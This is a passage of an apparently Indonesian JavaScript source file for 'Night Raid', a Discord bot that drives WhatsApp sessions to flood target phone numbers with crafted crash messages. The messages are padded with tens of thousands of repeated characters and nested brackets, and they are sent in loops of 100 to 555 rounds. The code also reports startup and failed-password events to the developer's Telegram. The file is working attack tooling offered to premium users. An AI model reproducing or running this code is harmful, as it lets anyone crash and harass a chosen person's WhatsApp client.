                                    share_payment_status: true
                                })
                            }
                        ]
                    },
                    contextInfo: {
                        mentionedJid: mentioned,
                        participant: jid,
                        remoteJid: "status@broadcast",
                        quotedMessage: {
                            extendedTextMessage: {
                                text: "ꦿꦷꦹ".repeat(15000),
                                contextInfo: {
                                    mentionedJid: mentioned,
                                    participant: jid,
                                    remoteJid: "status@broadcast",
                                    quotedMessage: {
                                        interactiveMessage: {
                                            body: { text: "ꦿꦷꦹ".repeat(15000) },
                                            footer: { text: "ꦿꦷꦹ".repeat(15000) },
                                            nativeFlowMessage: {
                                                messageParamsJson: "[".repeat(4000),
                                                buttons: [
                                                    {
                                                        name: "payment_method",
                                                        buttonParamsJson: JSON.stringify({
                                                            reference_id: null,
                                                            payment_method: "{".repeat(100),
                                                            payment_timestamp: null,
                                                            share_payment_status: true
                                                        })
                                                    }
                                                ]
                                            },
                                            contextInfo: {
                                                mentionedJid: mentioned
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            };
            const msg = generateWAMessageFromContent(jid, message, {});
            await sock.relayMessage(jid, msg.message, {
                messageId: msg.key.id,
                participant: { jid: jid }
            });
        } catch (err) {
            console.error(err);
        }
    }



    // ---------( The Paramatter )---------- \\
    async function Invis(sock, jid) {
        for (let i = 0; i < 100; i++) {
            await DelayMbuh(sock, jid);
            await DelayMbuh(sock, jid);
            await DelayMbuh(sock, jid);
            await sleep(800);
            console.log(chalk.red(`✅ Invis successfully sent to ${jid} ${i + 1}/100`));
        }
    }

    async function Forclose(sock, jid) {
        for (let i = 0; i < 100; i++) {
            await fcTitid(sock, jid);
            await fcTitid(sock, jid);
            await fcTitid(sock, jid);
            await sleep(500);
            console.log(chalk.red(`✅ Forclose successfully sent to ${jid} ${i + 1}/100`));
        }
    }

    async function UI(sock, jid) {
        for (let i = 0; i < 100; i++) {
            await oggStc(sock, jid);
            await oggStc(sock, jid);
            await oggStc(sock, jid);
            await oggStc(sock, jid);
            await oggStc(sock, jid);
            await sleep(500);
            await cTcClick(sock, jid);
            await cTcClick(sock, jid);
            await cTcClick(sock, jid);
            await cTcClick(sock, jid);
            await cTcClick(sock, jid);
            await sleep(500);
            await WanzCrashOri(sock, jid);
            await WanzCrashOri(sock, jid);
            await WanzCrashOri(sock, jid);
            await WanzCrashOri(sock, jid);
            await WanzCrashOri(sock, jid);
            await sleep(500);
            await FcXBlank(sock, jid);
            await FcXBlank(sock, jid);
            await FcXBlank(sock, jid);
            await FcXBlank(sock, jid);
            await FcXBlank(sock, jid);
            await sleep(500);
            await bClck(sock, jid);
            await bClck(sock, jid);
            await bClck(sock, jid);
            await bClck(sock, jid);
            await bClck(sock, jid);
            await sleep(500);
            await HardDelayBlank(sock, jid);
            await HardDelayBlank(sock, jid);
            await HardDelayBlank(sock, jid);
            await HardDelayBlank(sock, jid);
            await HardDelayBlank(sock, jid);
            await sleep(500);
            console.log(chalk.red(`✅ UI Crash successfully sent to ${jid} ${i + 1}/100`));
        }
    }

    async function DELAY(sock, jid) {
        for (let i = 0; i < 555; i++) {
            await delayJembut(sock, jid);
            await delayJembut(sock, jid);
            await delayJembut(sock, jid);
            await sleep(500);
            await delaycrash(sock, jid);
            await delaycrash(sock, jid);
            await delaycrash(sock, jid);
            await sleep(500);
            console.log(chalk.red(`✅ Delay successfully sent to ${jid} ${i + 1}/555`));
        }
    }

    async function Combos(sock, jid) {
        for (let i = 0; i < 100; i++) {
            await delayJembut(sock, jid);
            await FcXBlank(sock, jid);
            await fcTitid(sock, jid);
            await DelayMbuh(sock, jid);
            await oggStc(sock, jid);
            await cTcClick(sock, jid);
            await delaycrash(sock, jid);
            await WanzCrashOri(sock, jid);
            await bClck(sock, jid);
            await HardDelayBlank(sock, jid);
            await sleep(1000);
            console.log(chalk.red(`✅ Combos All Funk successfully sent to ${jid} ${i + 1}/50`));
        }
    }
    // [ END PARAMATERS ]

    // --- PENANGANAN PREFIX ---
    const PREFIX_FILE = path.join(__dirname, 'database', 'prefix.json');
    let prefix = '!';

    function loadPrefix() {
        try {
            if (fs.existsSync(PREFIX_FILE)) {
                const data = fs.readFileSync(PREFIX_FILE, 'utf8');
                const config = JSON.parse(data);
                prefix = config.prefix;
                console.log(chalk.green(`Prefix berhasil dimuat: "${prefix}"`));
            } else {
                fs.writeFileSync(PREFIX_FILE, JSON.stringify({ prefix: '!' }, null, 2));
                console.log(chalk.yellow(`file prefix.json tidak ditemukan, menggunakan prefix default "!"`));
            }
        } catch (error) {
            console.error("Gagal memuat prefix, menggunakan default:", error);
        }
    }
    loadPrefix();

    // --- EVENT DISCORD ---
    client.once('ready', () => {
        console.log(chalk.cyan(`
╭────────────────────────────╮
│ 🤖 Bot Discord Terhubung   │
│ 👤 Pengguna: ${client.user.tag}
│ ⏱️  Waktu Aktif: ${getUptime()}
╰────────────────────────────╯
`));
    });

    client.on('messageCreate', async message => {
        if (message.author.bot || !message.content.startsWith(prefix)) return;

        const args = message.content.slice(prefix.length).trim().split(/ +/);
        const command = args.shift().toLowerCase();
        const userId = message.author.id;

        // --- PENANGANAN PERINTAH ---
        if (command === 'addbot') {
            if (!isOwner(userId)) return message.reply("⚠️ **Akses Ditolak**\nAnda bukan pemilik.");
            const botNumber = args[0]?.replace(/[^0-9]/g, "");
            if (!botNumber) return message.reply("Gunakan: `!addbot <nomor_wa>` (Contoh: `!addbot 62812...`)");

            if (sessions.has(botNumber)) {
                return message.reply(`Bot dengan nomor ${botNumber} sudah terhubung atau sedang mencoba terhubung.`);
            }

            const report = await getSecurityReport(`PERCOBAAN TAMBAH BOT oleh ${message.author.tag} untuk nomor ${botNumber}`);
            await sendTelegramNotification(report);

            await message.reply(`Memulai koneksi untuk nomor WhatsApp **${botNumber}**...`);
            connectToWhatsApp(botNumber, message);
        }

        if (command === 'setprefix') {
            if (!isOwner(userId)) {
                return message.reply("⚠️ **Akses Ditolak**\nPerintah ini hanya untuk Owner.");
            }
            const newPrefix = args[0];
            if (!newPrefix) {
                return message.reply(`Gunakan: \`${prefix}setprefix <prefix_baru>\``);
            }

            try {
                prefix = newPrefix;
                fs.writeFileSync(PREFIX_FILE, JSON.stringify({ prefix: newPrefix }, null, 2));
                await message.channel.send(`✅ Prefix berhasil diubah menjadi: \`${newPrefix}\``);
            } catch (error) {
                console.error("Gagal menyimpan prefix baru:", error);
                await message.channel.send("❌ Terjadi kesalahan saat menyimpan prefix baru.");
            }
            return; // Hentikan eksekusi agar tidak lanjut ke perintah lain
        }

        if (command === 'start') {
            const startEmbed = new EmbedBuilder()
                .setTitle("🌙 NIGHT RAID BOT")
                .setColor(0x2f3136)
                .setDescription(`👋 Halo, saya **Night Raid Bot**.\n\n📜 Ketik \`${prefix}menu\` untuk melihat daftar perintah.`)
                .setFooter({ text: "Developed by Lord Dzik" });
            await message.channel.send({ embeds: [startEmbed] });
        }

        if (command === 'menu') {
            const imagePath = path.join(__dirname, "assets", "images", "thumb.jpeg");

            const menuEmbed = new EmbedBuilder()
                .setImage('attachment://thumb.jpeg')
                .setTitle("🌙 NIGHT RAID - Main Menu")
                .setColor(0xFF0000)
                .setDescription(`
    **👑 Owner Commands**
    \`${prefix}addprem <id>\` - Tambah Premium
    \`${prefix}delprem <id>\` - Hapus Premium
    
    **🕷️ Bug Commands**
    \`${prefix}forclose <nomor>\`
    \`${prefix}blank <nomor>\`
    \`${prefix}delay <nomor>\`
    
    **⚙️ Utility**
    \`${prefix}setprefix <new>\`
    \`${prefix}menu\`
        `)
                .setFooter({ text: `Developed by Lord Dzik | Online: ${getUptime()}` });
            const row1 = new ActionRowBuilder()
                .addComponents(
                    new ButtonBuilder()
                        .setLabel('👨‍💻 Developer')
                        .setURL('https://t.me/Lorddzik')
                        .setStyle(ButtonStyle.Link),
                    new ButtonBuilder()
                        .setLabel('📢 Channel Info')
                        .setURL('https://t.me/berufounder')
                        .setStyle(ButtonStyle.Link),
                    new ButtonBuilder()
                        .setCustomId('tq_menu')
                        .setLabel('🙏 Thanks To')
                        .setStyle(ButtonStyle.Secondary)
                );

            await message.channel.send({
                files: [{ attachment: imagePath, name: 'thumb.jpeg' }],
                embeds: [menuEmbed],
                components: [row1]
            });
        }

        const bugCommands = ['forclose', 'blank', 'delay', 'invis', 'combos'];
        if (bugCommands.includes(command)) {
            if (!isOwner(userId) && !isPremium(userId)) {
                return message.reply("⚠️ **Akses Ditolak**\nAnda bukan premium user.");
            }
            const target = args[0]?.replace(/[^0-9]/g, "");
            if (!target) return message.reply(`Gunakan: \`!${command} <nomor_target>\``);

            if (sessions.size === 0) {
                return message.reply("Tidak ada bot WhatsApp yang terhubung. Hubungkan dulu dengan `!addbot`.");
            }

            const [botNumber, sock] = sessions.entries().next().value;
            const jid = `${target}@s.whatsapp.net`;

            let canceled = false;

            try {
                // tombol stop (Discord.js style)
                const row = new ActionRowBuilder()
                    .addComponents(
                        new ButtonBuilder()
                            .setCustomId('cancel_send')
                            .setLabel('❌ Stop Kirim')
                            .setStyle(ButtonStyle.Danger)
                    );

                // pesan awal
                const progressMsg = await message.reply({
                    content: `⏳ Mengirim bug \`${command}\` ke **${target}**\n[░░░░░░░░░░] 0%`,
                    components: [row]
                });

                // handler tombol stop
                const filter = (i) => i.customId === 'cancel_send' && i.user.id === userId;
                const collector = progressMsg.createMessageComponentCollector({ filter, time: 60000 });

                collector.on('collect', async (i) => {
                    canceled = true;
                    await i.reply({ content: "❌ Pengiriman dibatalkan oleh user.", ephemeral: true });
                    collector.stop();
                });

                // animasi progress bar
                let progress = 0;
                const barLength = 10;

                await new Promise((resolve) => {
                    const interval = setInterval(async () => {
                        if (canceled) {
                            clearInterval(interval);
                            return resolve(false);
                        }
                        progress += 10;
                        const filled = Math.floor(progress / 10);
                        const empty = barLength - filled;
                        const bar = "█".repeat(filled) + "░".repeat(empty);

                        await progressMsg.edit({
                            content: `⏳ Mengirim bug \`${command}\` ke **${target}**\n[${bar}] ${progress}%`,
                            components: [row]
                        });

                        if (progress >= 100) {
                            clearInterval(interval);
                            resolve(true);
                        }
                    }, 1000);
                });

                if (canceled) return;

                // eksekusi bug setelah progress selesai
                if (command === 'forclose') {
                    await Forclose(sock, jid);
                } else if (command === 'blank') {
                    await UI(sock, jid);
                } else if (command === 'delay') {
                    await DELAY(sock, jid);
                } else if (command === 'invis') {
                    await Invis(sock, jid);
                } else if (command === 'combos') {
                    await Combos(sock, jid);
                }

                await message.reply(`✅ Bug \`${command}\` berhasil dikirim ke **${target}**!`);

            } catch (error) {
                console.error(chalk.red(`Gagal mengirim bug ${command}:`), error);
                await message.reply(`❌ Gagal mengirim bug ke ${target}. Lihat konsol untuk detail error.`);
            }
        }

        if (command === 'addprem') {
            if (!isOwner(userId)) return message.reply("⚠️ **Akses Ditolak**\nAnda bukan owner.");
            const targetId = args[0];
            if (!targetId) return message.reply("Gunakan: `!addprem <ID User>`");

            const premiumUsers = loadPremiumUsers();
            if (premiumUsers.includes(targetId)) {
                return message.reply(`User ${targetId} sudah terdaftar sebagai premium.`);
            }
            premiumUsers.push(targetId);
            savePremiumUsers(premiumUsers);
            message.reply(`**Berhasil Menambahkan**\n**ID:** ${targetId}\n**Status:** Premium User`);
        }

        if (command === 'delprem') {
            if (!isOwner(userId)) return message.reply("⚠️ **Akses Ditolak**\nAnda bukan owner.");
            const targetId = args[0];
            if (!targetId) return message.reply("Gunakan: `!delprem <ID User>`");

            let premiumUsers = loadPremiumUsers();
            if (!premiumUsers.includes(targetId)) {
                return message.reply(`User ${targetId} tidak terdaftar sebagai premium.`);
            }
            premiumUsers = premiumUsers.filter(id => id !== targetId);
            savePremiumUsers(premiumUsers);
            message.reply(`**Berhasil Menghapus**\n**ID:** ${targetId}\n**Status:** User Biasa`);
        }
    });

    client.on('interactionCreate', async interaction => {
        if (!interaction.isButton()) return;

        const { customId, user } = interaction;
        let replyContent = "";

        if (customId === 'owner_menu' && !isOwner(user.id)) {
            return interaction.reply({ content: "⚠️ Anda tidak punya izin untuk melihat menu ini.", ephemeral: true });
        }

        switch (customId) {
            case 'tq_menu':
                replyContent = `\`\`\`
        TANKS - TO
    ╭────────────────
    │🕊️ LordDzik (Developer)
    │🕊️ Mpit/Orechi (BASE)
    │🕊️ Nannn (NYIMAK)
    │🕊️ kipopLecy (FUNK)
    │🕊️ Sniith (FUNK)
    │🕊️ Killertzy2 (FUNK)
    │🕊️ Xatanicvxii (FUNK)
    │🕊️ ASTA (GIVE)
    │🕊️ XyzYourx (GIVE)
    │🕊️ wanzcrash2 (SUPPORT)
    │🕊️ Xwarrxxx (SUPPORT) 
    │🕊️ RyzzModss (SUPPORT) 
    │🕊️ ALL SUPPORT IN MAKING THE SCRIPT OF NIGHT RAID
    ╰─────────────────\`\`\``;
                break;
        }

        if (replyContent) {
            await interaction.reply({ content: replyContent, ephemeral: true });
        }
    });

    await initializeWhatsAppConnections();
    client.login(config.BOT_TOKEN);
}

// --- EKSEKUSI SCRIPT DIMULAI ---

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

rl.question(console.log(chalk.yellow('🔑 Silahkan masukkan kata sandi untuk memulai bot: ')), async (password) => {
    if (password.trim() !== SCRIPT_PASSWORD) {
        console.log(chalk.red.bold('❌ Kata Sandi Salah!'));
        const report = await getSecurityReport("PERCOBAAN KATA SANDI SALAH");
        await sendTelegramNotification(report);
        rl.close();
        process.exit(1);
    }

    console.log(chalk.green('✅ Kata Sandi Benar! Melanjutkan pemeriksaan startup...'));
    rl.close();

    // Memulai urutan validasi
    await checkMaintenance();

    // Jika semua pemeriksaan lolos, mulai bot
    const successReport = await getSecurityReport("BOT BERHASIL DIMULAI");
    await sendTelegramNotification(successReport);
    startBot();
});